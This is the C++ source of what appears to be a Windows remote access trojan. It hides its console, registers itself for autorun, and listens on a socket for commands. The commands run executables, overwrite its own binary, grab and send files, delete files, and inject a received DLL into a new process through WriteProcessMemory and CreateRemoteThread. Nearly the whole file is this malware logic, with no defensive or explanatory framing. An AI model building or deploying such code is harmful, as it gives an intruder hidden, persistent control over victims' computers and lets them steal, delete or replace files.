#include "winsockfuncs.h"
#include "autorun.h"
#include <iphlpapi.h>
#include <iostream>
using namespace std;
#define REG_NAME "server_final"
#define DEFAULT_PORT "8850"
#define DEFAULT_IP "127.0.0.1"
#define VERSION 10
#define DEFAULT_BUFLEN 1024
#define BIG_BUFLEN 65536



void pong(SOCKET);
void run(char*);
void update_exe(PCHAR,int);
void inj_dll(char*,int, char*);

int main(){
	try {
		
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		char path[DEFAULT_BUFLEN];
		GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
		autorunProj(REG_NAME, path);
		HANDLE tex = CreateMutexA(NULL, FALSE, "allow");
		DWORD state = WaitForSingleObject(tex, 0);
		if (state != WAIT_OBJECT_0) {
			throw("program already running\n");
		}
		SOCKET socket = connectServerSocket(DEFAULT_PORT);
		char recvmsg[BIG_BUFLEN];

		//-------------------------------------------------
		while (true) {
			strcpy_s(recvmsg,recvMessage(socket));
			printf("Client sent: %s\n", recvmsg);

			if (strcmp(recvmsg, "PING") == 0) {//PING
				//response
				sendMessage("PONG", socket);
			}
			else if (strcmp(recvmsg, "RUN") == 0) {//RUN
				//get exe path
				strcpy_s(recvmsg, recvMessage(socket));
				printf("Client sent: %s\n", recvmsg);
				//run exe
				run(recvmsg);
				//conformation
				sendMessage("process has been run", socket);
			}
			else if (strcmp(recvmsg, "PRINT") == 0) {//PRNT
				//get string
				strcpy_s(recvmsg, recvMessage(socket));
				printf("Client sent: %s\n", recvmsg);
				//print string
				printf("%s\n",recvmsg);
			}
			else if (strcmp(recvmsg, "UPDATE") == 0) {//UPDATE
				//get new exe
				int size = atoi(recvMessage(socket, DEFAULT_BUFLEN));
				char* buff = recvFile(socket, size);
				//update exe
				update_exe(buff,size);
				//conformation
				sendMessage("exe file updated",socket);
			}
			else if (strcmp(recvmsg, "VERSION") == 0) {//VERSION
				//response
				char sendmsg[DEFAULT_BUFLEN];
				sprintf_s(sendmsg, DEFAULT_BUFLEN, "%d", VERSION);
				sendMessage(sendmsg, socket);
			}
			else if (strcmp(recvmsg, "HIDE") == 0) {//HIDE
				ShowWindow(GetConsoleWindow(), SW_HIDE);
				//conformation
				sendMessage("console hidden", socket);
			}
			else if (strcmp(recvmsg, "SHOW") == 0) {//SHOW
				ShowWindow(GetConsoleWindow(), SW_SHOW);
				//conformation
				sendMessage("console shown", socket);
			}
			else if (strcmp(recvmsg, "INJ") == 0) {//DLL INJECTION
				//get dll
				int size = atoi(recvMessage(socket, DEFAULT_BUFLEN));
				char* buff = recvFile(socket, size);
				//get proc path
				char proc_path[DEFAULT_BUFLEN];
				strcpy_s(proc_path, recvMessage(socket));
				printf("Client sent: %s\n", proc_path);
				//inject dll
				inj_dll(buff, size, proc_path);
				//conformation
				sendMessage("dll injected", socket);
			}
			else if (strcmp(recvmsg, "GRAB") == 0) {//GRAB
				//get file path
				char* path = recvMessage(socket);
				//read file
				HANDLE fin = CreateFileA(path, GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				int size = GetFileSize(fin, NULL);
				char* buff = (char*)malloc(size);
				ReadFile(fin, buff, size, NULL, NULL);
				//send file
				char size_str[DEFAULT_BUFLEN];
				sprintf_s(size_str, "%d", size, DEFAULT_BUFLEN);
				sendMessage(size_str, socket);
				sendFile(socket, buff, size);
				//conformation
				sendMessage("file grabbed and saved to downloads as grabbed.txt", socket);
			}
			else if (strcmp(recvmsg, "DELETE") == 0) {
				//get file path
				char* path = recvMessage(socket);
				//delete file
				DeleteFileA(path);
				//conformation
				sendMessage("file deleted", socket);
			}
			else if (strcmp(recvmsg, "CLOSE") == 0) {//CLOSE 
				break;
			}
			else {
				printf("Illegal command\n");
			}

		}
		ShowWindow(GetConsoleWindow(), SW_SHOW);
		printf("socket disconnected\n");
		closeSocket(socket);
		ReleaseMutex(tex);
		CloseHandle(tex);
		system("pause");
		
	}
	catch (const char* err) {
		printf(err);
		ShowWindow(GetConsoleWindow(), SW_SHOW);
		system("pause");
	}
}

void run(char* path) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcessA(
		NULL,
		path,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void update_exe(char* data, int size) {
	//create temp path
	PCHAR path = (PCHAR)malloc(DEFAULT_BUFLEN);
	GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
	PCHAR old_path = (PCHAR)malloc(DEFAULT_BUFLEN);
	strcpy_s(old_path, DEFAULT_BUFLEN, path);
	old_path[strlen(old_path) - 4] = '\0';
	const char* help = "_temp.exe";
	strcat_s(old_path, DEFAULT_BUFLEN, help);
	//delete old temp
	DeleteFileA(old_path);
	//change current to temp
	rename(path, old_path);
	//save recv exe as current
	HANDLE fout = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fout_size;
	WriteFile(fout, data, size, &fout_size, NULL);
	CloseHandle(fout);
}

void inj_dll(char* dll, int size, char* proc_path) {
	//write dll
	char dll_path[DEFAULT_BUFLEN];
	GetModuleFileNameA(NULL, dll_path, DEFAULT_BUFLEN);
	dll_path[strlen(dll_path) - 16] = '\0';
	strcat_s(dll_path, "inj_dll.dll");
	HANDLE fout = CreateFileA(dll_path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(fout, dll, size, NULL, NULL);
	CloseHandle(fout);
	//inject dll
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcessA(
		NULL,
		proc_path,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	int pid = pi.dwProcessId;
	PVOID load_library = (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	HANDLE dest_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	PVOID remote_dll_path = VirtualAllocEx(dest_proc, NULL, strlen(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(dest_proc, remote_dll_path, dll_path, strlen(dll_path), NULL);
	HANDLE remote_thread = CreateRemoteThread(dest_proc, NULL, 0, (LPTHREAD_START_ROUTINE)load_library, remote_dll_path, 0, NULL);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}